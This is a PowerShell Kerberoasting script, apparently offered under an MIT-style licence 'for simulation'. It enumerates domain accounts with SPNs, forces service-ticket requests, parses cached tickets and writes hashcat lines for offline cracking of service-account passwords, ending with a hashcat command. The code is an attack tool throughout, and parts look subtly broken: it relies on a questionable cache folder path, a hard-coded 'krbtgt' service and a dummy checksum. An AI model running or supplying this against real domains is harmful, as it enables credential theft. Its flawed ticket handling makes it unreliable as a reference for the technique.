########################################################################################################################################################################################
# Powershell kerbroasting Script by: 41ph4-01 for simulation 11/04/2024
# Enumerates SPN accounts in the domain, then requests TGS tickets by forcing network connections to service hosts, reads the Kerberos ticket cache files, parses each ticket with a real recursive 
# ASN.1 DER TLV parser in PowerShell, extracts username, realm, and encrypted ticket parts, outputs hashcat-compatible cracking lines.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
########################################################################################################################################################################################


function Invoke-DerKerberoast {
    [CmdletBinding()]
    param (
        [string]$Domain = $env:USERDNSDOMAIN,
        [string]$OutputFile = "$PWD\kerberoast_hashes.txt"
    )

    Write-Host "[*] Enumerating SPN accounts in domain $Domain..."
    $spnUsers = Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName

    if ($spnUsers.Count -eq 0) {
        Write-Warning "No accounts with SPNs found."
        return
    }

    $requestedSpns = @()
    foreach ($user in $spnUsers) {
        foreach ($spn in $user.ServicePrincipalName) {
            Write-Host "[+] $($user.SamAccountName)   SPN: $spn"
            try {
                # Attempt TCP connection to service host to force TGS request
                $targetHost = $spn.Split('/')[1]
                Write-Verbose "Trying TCP 445 to $targetHost ..."
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.Connect($targetHost, 445)
                $tcpClient.Dispose()
                $requestedSpns += [PSCustomObject]@{
                    User = $user.SamAccountName
                    SPN  = $spn
                }
            }
            catch {
                Write-Warning "Could not request TGS for $spn - $_"
            }
        }
    }

    if ($requestedSpns.Count -eq 0) {
        Write-Warning "No TGS requests were made, exiting."
        return
    }

    Write-Host "`n[*] Parsing Kerberos ticket cache..."

    $krbCachePath = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Windows\Kerberos\Cache"
    if (-not (Test-Path $krbCachePath)) {
        Write-Warning "Kerberos ticket cache folder not found at $krbCachePath"
        return
    }

    $tickets = Get-ChildItem -Path $krbCachePath -File
    if ($tickets.Count -eq 0) {
        Write-Warning "No tickets found in cache."
        return
    }

    $hashcatLines = @()

    foreach ($ticket in $tickets) {
        Write-Verbose "Parsing ticket file $($ticket.Name)..."
        try {
            $ticketBytes = [System.IO.File]::ReadAllBytes($ticket.FullName)
            $parsed = Parse-Asn1 -Data $ticketBytes
            $hash = Convert-TicketToHashcat -Parsed $parsed
            if ($hash) {
                Write-Host "[*] Hashcat line:`n$hash`n"
                $hashcatLines += $hash
            }
            else {
                Write-Verbose "No valid hash found in $($ticket.Name)."
            }
        }
        catch {
            Write-Warning "Failed parsing $($ticket.Name): $_"
        }
    }

    if ($hashcatLines.Count -gt 0) {
        Write-Host "[*] Saving all hashes to file: $OutputFile"
        $hashcatLines | Out-File -FilePath $OutputFile -Encoding ascii
        Write-Host "[*] Done."
    }
    else {
        Write-Warning "No hashes extracted from tickets."
    }
}

function Parse-Asn1 {
    [CmdletBinding()]
    param(
        [byte[]]$Data
    )
    $pos = 0
    return Parse-TLV -Data $Data -Position ([ref]$pos)
}

function Parse-TLV {
    param(
        [byte[]]$Data,
        [ref]$Position
    )
    $items = @()
    while ($Position.Value -lt $Data.Length) {
        if ($Position.Value -ge $Data.Length) { break }
        $tag = $Data[$Position.Value]
        $Position.Value++
        if ($Position.Value -ge $Data.Length) { break }

        $length = $Data[$Position.Value]
        $Position.Value++
        if ($length -gt 127) {
            $numlen = $length - 128
            if ($Position.Value + $numlen - 1 -ge $Data.Length) { break }
            $lenBytes = $Data[$Position.Value..($Position.Value + $numlen - 1)]
            $Position.Value += $numlen
            # convert big endian length
            $length = 0
            foreach ($b in $lenBytes) {
                $length = ($length * 256) + $b
            }
        }

        if ($Position.Value + $length - 1 -ge $Data.Length) { break }
        $value = $Data[$Position.Value..($Position.Value + $length - 1)]
        $Position.Value += $length

        # Check if constructed type (bit 6 set = 0x20)
        if (($tag -band 0x20) -eq 0x20) {
            $nestedPos = 0
            $nested = Parse-TLV -Data $value -Position ([ref]$nestedPos)
            $items += [PSCustomObject]@{
                Tag = $tag
                Value = $nested
            }
        }
        else {
            $items += [PSCustomObject]@{
                Tag = $tag
                Value = $value
            }
        }
    }
    return $items
}

function Convert-TicketToHashcat {
    param(
        $Parsed
    )
    # Flatten the parsed TLV tree
    $flat = Flatten-TLV $Parsed

    # Attempt to extract user and realm strings
    $userBytes = ($flat | Where-Object { $_.Tag -eq 0x1b -or $_.Tag -eq 0x1c } | Select-Object -First 1).Value
    $realmBytes = ($flat | Where-Object { $_.Tag -eq 0x1b -or $_.Tag -eq 0x1c } | Select-Object -Last 1).Value
    $encBytes = ($flat | Where-Object { $_.Tag -eq 0x04 } | Select-Object -Last 1).Value

    if (-not $userBytes -or -not $encBytes) {
        Write-Verbose "Unable to locate necessary user or encrypted data in ticket."
        return $null
    }

    try {
        $userStr = [System.Text.Encoding]::ASCII.GetString($userBytes)
        $realmStr = if ($realmBytes) { [System.Text.Encoding]::ASCII.GetString($realmBytes) } else { "UNKNOWN" }
        $encHex = ($encBytes | ForEach-Object { $_.ToString("x2") }) -join ""

        # Compose a simplified hashcat TGS-REP line format:
        # $krb5tgs$23$*user$realm$service$checksum$enc
        $service = "krbtgt"
        $checksum = "1122334455667788" # dummy checksum placeholder

        return "\$krb5tgs\$23\$*$userStr*$realmStr*$service*$checksum\$$encHex"
    }
    catch {
        Write-Verbose "Error converting ticket to hashcat line: $_"
        return $null
    }
}

function Flatten-TLV {
    param(
        $Items
    )
    $flat = @()
    foreach ($i in $Items) {
        if ($i.Value -is [System.Collections.IEnumerable] -and
            $i.Value -isnot [byte[]]) {
            $flat += Flatten-TLV $i.Value
        }
        else {
            $flat += $i
        }
    }
    return $flat
}

# Allow verbose output for debug
$VerbosePreference = "Continue"


#Usage
# Load script (dot-source)
#. .\Invoke-DerKerberoast.ps1

# Run with defaults
#Invoke-DerKerberoast

# Or specify domain and output file path
#Invoke-DerKerberoast -Domain "corp.example.com" -OutputFile "C:\temp\hashes.txt"
# hashcat -m 13100 kerberoast_hashes.txt your_wordlist.txt
